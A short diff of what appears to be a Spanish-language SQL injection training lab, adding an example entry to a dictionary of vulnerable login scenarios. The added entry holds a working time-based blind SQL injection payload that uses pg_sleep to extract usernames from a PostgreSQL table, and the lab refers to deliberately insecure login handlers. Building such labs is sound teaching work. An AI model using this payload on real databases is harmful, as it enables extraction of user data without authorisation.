@@ -190,12 +190,17 @@ sql_injections = {
         """,
         "dificultad": 3,
         "impacto": 3,
-        "credenciales":[],
+        "credenciales":[{
+            "nombre": "Obtener nombres de usuarios",
+            "usuario": "' AND ( LEFT((SELECT string_agg(username, ',') FROM Usuarios), 1) <> 'a' OR ( LEFT((SELECT string_agg(username, ',') FROM Usuarios), 1) = 'a' AND ( SELECT NULL FROM pg_sleep(2) ) IS NULL ) ) --",
+            "password": "cualquier_input"
+        }
+        ],
         "usuario": "admin",
         "clave": "admin",
         "route_oracle": "login_oracle_time_based",
         "route_postgres": "login_postgres_time_based",
         "function_oracle": login_inseguro_blind_oracle,
-        "function_postgres": login_inseguro_blind_postgresql
+        "function_postgres":  login_inseguro_blind_no_cookie_postgresql
     }
 }
